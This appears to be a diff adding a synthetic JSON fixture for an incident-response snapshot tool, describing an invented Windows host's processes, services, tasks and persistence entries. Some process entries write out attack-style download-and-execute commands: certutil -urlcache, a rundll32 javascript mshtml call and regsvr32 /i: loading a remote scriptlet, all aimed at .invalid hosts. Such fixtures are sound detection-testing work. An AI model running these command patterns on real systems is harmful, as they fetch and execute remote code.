@@ -1,0 +1,453 @@
+{
+  "schema_version": "1.0",
+  "snapshot_id": "00000000-0000-0000-0000-0000000000c9",
+  "tool_version": "0.3.0",
+  "started_at": "2026-09-17T14:05:00Z",
+  "finished_at": "2026-09-17T14:05:10Z",
+  "system": null,
+  "processes": [
+    {
+      "artifact_id": "00000000-0000-0000-0000-000000000578",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "processes",
+      "pid": 400,
+      "ppid": 100,
+      "name": "explorer.exe",
+      "executable": "C:\\Windows\\explorer.exe",
+      "command_line": [
+        "C:\\Windows\\explorer.exe"
+      ],
+      "username": "EXAMPLE-LAB\\ExampleUser",
+      "created_at": "2026-09-17T14:00:00Z"
+    },
+    {
+      "artifact_id": "00000000-0000-0000-0000-000000000582",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "processes",
+      "pid": 410,
+      "ppid": 400,
+      "name": "WINWORD.EXE",
+      "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "command_line": [
+        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      ],
+      "username": "EXAMPLE-LAB\\ExampleUser",
+      "created_at": "2026-09-17T14:00:01Z"
+    },
+    {
+      "artifact_id": "00000000-0000-0000-0000-00000000058c",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "processes",
+      "pid": 420,
+      "ppid": 410,
+      "name": "powershell.exe",
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": null,
+      "username": "EXAMPLE-LAB\\ExampleUser",
+      "created_at": "2026-09-17T14:00:02Z"
+    },
+    {
+      "artifact_id": "00000000-0000-0000-0000-00000000058d",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "processes",
+      "pid": 421,
+      "ppid": 410,
+      "name": "cmd.exe",
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command_line": [
+        "C:\\Windows\\System32\\cmd.exe",
+        "/c",
+        "echo",
+        "Synthetic fixture only"
+      ],
+      "username": "EXAMPLE-LAB\\ExampleUser",
+      "created_at": "2026-09-17T14:00:03Z"
+    },
+    {
+      "artifact_id": "00000000-0000-0000-0000-00000000058e",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "processes",
+      "pid": 422,
+      "ppid": 410,
+      "name": "wscript.exe",
+      "executable": "C:\\Windows\\System32\\wscript.exe",
+      "command_line": [
+        "C:\\Windows\\System32\\wscript.exe",
+        "C:\\IRSnapshotFixtures\\example.vbs"
+      ],
+      "username": "EXAMPLE-LAB\\ExampleUser",
+      "created_at": "2026-09-17T14:00:04Z"
+    },
+    {
+      "artifact_id": "00000000-0000-0000-0000-000000000596",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "processes",
+      "pid": 430,
+      "ppid": 400,
+      "name": "example-installer.exe",
+      "executable": "C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example-installer.exe",
+      "command_line": [
+        "C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example-installer.exe",
+        "--synthetic"
+      ],
+      "username": "EXAMPLE-LAB\\ExampleUser",
+      "created_at": "2026-09-17T14:00:05Z"
+    },
+    {
+      "artifact_id": "00000000-0000-0000-0000-000000000597",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "processes",
+      "pid": 431,
+      "ppid": 400,
+      "name": "example-agent.exe",
+      "executable": "C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\example-agent.exe",
+      "command_line": [
+        "C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\example-agent.exe",
+        "--synthetic"
+      ],
+      "username": "EXAMPLE-LAB\\ExampleUser",
+      "created_at": "2026-09-17T14:00:06Z"
+    },
+    {
+      "artifact_id": "00000000-0000-0000-0000-0000000005a0",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "processes",
+      "pid": 440,
+      "ppid": 400,
+      "name": "certutil.exe",
+      "executable": "C:\\Windows\\System32\\certutil.exe",
+      "command_line": [
+        "C:\\Windows\\System32\\certutil.exe",
+        "-urlcache",
+        "-split",
+        "-f",
+        "https://downloads.example.invalid/sample.txt",
+        "C:\\IRSnapshotFixtures\\sample.txt"
+      ],
+      "username": "EXAMPLE-LAB\\ExampleUser",
+      "created_at": "2026-09-17T14:00:07Z"
+    },
+    {
+      "artifact_id": "00000000-0000-0000-0000-0000000005a1",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "processes",
+      "pid": 441,
+      "ppid": 400,
+      "name": "rundll32.exe",
+      "executable": "C:\\Windows\\System32\\rundll32.exe",
+      "command_line": [
+        "C:\\Windows\\System32\\rundll32.exe",
+        "javascript:\"..\\mshtml,RunHTMLApplication\";/* inert synthetic marker */"
+      ],
+      "username": "EXAMPLE-LAB\\ExampleUser",
+      "created_at": "2026-09-17T14:00:08Z"
+    },
+    {
+      "artifact_id": "00000000-0000-0000-0000-0000000005a2",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "processes",
+      "pid": 442,
+      "ppid": 400,
+      "name": "regsvr32.exe",
+      "executable": "C:\\Windows\\System32\\regsvr32.exe",
+      "command_line": [
+        "C:\\Windows\\System32\\regsvr32.exe",
+        "/s",
+        "/n",
+        "/u",
+        "/i:https://scripts.example.invalid/example.sct",
+        "scrobj.dll"
+      ],
+      "username": "EXAMPLE-LAB\\ExampleUser",
+      "created_at": "2026-09-17T14:00:09Z"
+    }
+  ],
+  "network": [],
+  "users": [
+    {
+      "artifact_id": "00000000-0000-0000-0000-000000000004",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "users",
+      "name": "ExampleUser",
+      "domain": "EXAMPLE-LAB",
+      "sid": "S-1-5-21-100-200-300-1001",
+      "source": "current_token",
+      "enabled": true,
+      "session_name": null,
+      "logged_in_at": null,
+      "member_of_sid": null
+    }
+  ],
+  "services": [
+    {
+      "artifact_id": "00000000-0000-0000-0000-000000000005",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "services",
+      "name": "ExampleService",
+      "display_name": "Synthetic example service",
+      "status": "stopped",
+      "command": "\"C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe\" --synthetic",
+      "startup_type": "automatic",
+      "username": "LocalSystem",
+      "pid": null
+    }
+  ],
+  "scheduled_tasks": [
+    {
+      "artifact_id": "00000000-0000-0000-0000-000000000006",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "scheduled_tasks",
+      "name": "ExampleTask",
+      "task_path": "\\Examples\\",
+      "state": "Disabled",
+      "enabled": false,
+      "principal": "ExampleUser",
+      "actions": [
+        {
+          "kind": "exec",
+          "executable": "C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe",
+          "arguments": "--synthetic",
+          "working_directory": null,
+          "class_id": null
+        },
+        {
+          "kind": "exec",
+          "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "arguments": "-NoProfile -File \"C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example script.ps1\"",
+          "working_directory": null,
+          "class_id": null
+        }
+      ],
+      "triggers": [
+        {
+          "kind": "time",
+          "enabled": false,
+          "start_boundary_raw": "2026-09-18T12:00:00",
+          "end_boundary_raw": null,
+          "start_at": null,
+          "end_at": null,
+          "user_id": null,
+          "repetition_interval": null
+        }
+      ]
+    }
+  ],
+  "persistence": [
+    {
+      "artifact_id": "00000000-0000-0000-0000-000000000007",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "persistence",
+      "kind": "service",
+      "location": "Services/ExampleService",
+      "entry_name": "ExampleService",
+      "command": "\"C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe\" --synthetic",
+      "target_path": null,
+      "owner_sid": null,
+      "registry_view": null,
+      "registry_value_type": null,
+      "enabled": true,
+      "source_artifact_id": "00000000-0000-0000-0000-000000000005",
+      "action_index": null
+    },
+    {
+      "artifact_id": "00000000-0000-0000-0000-000000000008",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "persistence",
+      "kind": "run_key",
+      "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "entry_name": "ExampleStartup",
+      "command": "\"%APPDATA%\\ExampleVendor\\startup.exe\" --synthetic",
+      "target_path": null,
+      "owner_sid": "S-1-5-21-100-200-300-1001",
+      "registry_view": "64",
+      "registry_value_type": "REG_EXPAND_SZ",
+      "enabled": true,
+      "source_artifact_id": null,
+      "action_index": null
+    },
+    {
+      "artifact_id": "00000000-0000-0000-0000-000000000009",
+      "observed_at": "2026-09-17T14:05:00Z",
+      "collector": "persistence",
+      "kind": "scheduled_task",
+      "location": "\\Examples\\ExampleTask",
+      "entry_name": "ExampleTask",
+      "command": null,
+      "target_path": "C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe",
+      "owner_sid": null,
+      "registry_view": null,
+      "registry_value_type": null,
+      "enabled": false,
+      "source_artifact_id": "00000000-0000-0000-0000-000000000006",
+      "action_index": 0
+    }
+  ],
+  "path_context": {
+    "known_paths": [
+      {
+        "kind": "windows",
+        "path": "C:\\Windows",
+        "owner_sid": null,
+        "source": "synthetic fixture"
+      },
+      {
+        "kind": "profile",
+        "path": "C:\\Users\\ExampleUser",
+        "owner_sid": "S-1-5-21-100-200-300-1001",
+        "source": "synthetic fixture"
+      },
+      {
+        "kind": "appdata",
+        "path": "C:\\Users\\ExampleUser\\AppData\\Roaming",
+        "owner_sid": "S-1-5-21-100-200-300-1001",
+        "source": "synthetic fixture"
+      },
+      {
+        "kind": "local_appdata",
+        "path": "C:\\Users\\ExampleUser\\AppData\\Local",
+        "owner_sid": "S-1-5-21-100-200-300-1001",
+        "source": "synthetic fixture"
+      },
+      {
+        "kind": "temp",
+        "path": "C:\\Users\\ExampleUser\\AppData\\Local\\Temp",
+        "owner_sid": "S-1-5-21-100-200-300-1001",
+        "source": "synthetic fixture"
+      }
+    ],
+    "environment": [
+      {
+        "name": "SystemRoot",
+        "value": "C:\\Windows",
+        "owner_sid": null
+      },
+      {
+        "name": "APPDATA",
+        "value": "C:\\Users\\ExampleUser\\AppData\\Roaming",
+        "owner_sid": "S-1-5-21-100-200-300-1001"
+      },
+      {
+        "name": "LOCALAPPDATA",
+        "value": "C:\\Users\\ExampleUser\\AppData\\Local",
+        "owner_sid": "S-1-5-21-100-200-300-1001"
+      },
+      {
+        "name": "TEMP",
+        "value": "C:\\Users\\ExampleUser\\AppData\\Local\\Temp",
+        "owner_sid": "S-1-5-21-100-200-300-1001"
+      }
+    ]
+  },
+  "collector_runs": [
+    {
+      "collector": "system",
+      "status": "failed",
+      "started_at": "2026-09-17T14:05:00Z",
+      "finished_at": "2026-09-17T14:05:10Z",
+      "item_count": 0,
+      "scope": [
+        "Invented review fixture only; not a live collection or a complete Windows inventory."
+      ],
+      "issues": [
+        {
+          "collector": "system",
+          "category": "unavailable",
+          "message": "Synthetic collection failure for demonstration.",
+          "observed_at": "2026-09-17T14:05:00Z",
+          "artifact_id": null,
+          "target": null,
+          "field": null,
+          "exception_type": null
+        }
+      ]
+    },
+    {
+      "collector": "processes",
+      "status": "partial",
+      "started_at": "2026-09-17T14:05:00Z",
+      "finished_at": "2026-09-17T14:05:10Z",
+      "item_count": 10,
+      "scope": [
+        "Invented review fixture only; not a live collection or a complete Windows inventory."
+      ],
+      "issues": [
+        {
+          "collector": "processes",
+          "category": "access_denied",
+          "message": "Synthetic denied command-line field; other process fields retained.",
+          "observed_at": "2026-09-17T14:05:00Z",
+          "artifact_id": "00000000-0000-0000-0000-00000000058c",
+          "target": null,
+          "field": "command_line",
+          "exception_type": null
+        }
+      ]
+    },
+    {
+      "collector": "network",
+      "status": "failed",
+      "started_at": "2026-09-17T14:05:00Z",
+      "finished_at": "2026-09-17T14:05:10Z",
+      "item_count": 0,
+      "scope": [
+        "Invented review fixture only; not a live collection or a complete Windows inventory."
+      ],
+      "issues": [
+        {
+          "collector": "network",
+          "category": "unavailable",
+          "message": "Synthetic collection failure for demonstration.",
+          "observed_at": "2026-09-17T14:05:00Z",
+          "artifact_id": null,
+          "target": null,
+          "field": null,
+          "exception_type": null
+        }
+      ]
+    },
+    {
+      "collector": "users",
+      "status": "ok",
+      "started_at": "2026-09-17T14:05:00Z",
+      "finished_at": "2026-09-17T14:05:10Z",
+      "item_count": 1,
+      "scope": [
+        "Invented review fixture only; not a live collection or a complete Windows inventory."
+      ],
+      "issues": []
+    },
+    {
+      "collector": "services",
+      "status": "ok",
+      "started_at": "2026-09-17T14:05:00Z",
+      "finished_at": "2026-09-17T14:05:10Z",
+      "item_count": 1,
+      "scope": [
+        "Invented review fixture only; not a live collection or a complete Windows inventory."
+      ],
+      "issues": []
+    },
+    {
+      "collector": "scheduled_tasks",
+      "status": "ok",
+      "started_at": "2026-09-17T14:05:00Z",
+      "finished_at": "2026-09-17T14:05:10Z",
+      "item_count": 1,
+      "scope": [
+        "Invented review fixture only; not a live collection or a complete Windows inventory."
+      ],
+      "issues": []
+    },
+    {
+      "collector": "persistence",
+      "status": "ok",
+      "started_at": "2026-09-17T14:05:00Z",
+      "finished_at": "2026-09-17T14:05:10Z",
+      "item_count": 3,
+      "scope": [
+        "Invented review fixture only; not a live collection or a complete Windows inventory."
+      ],
+      "issues": []
+    }
+  ]
+}
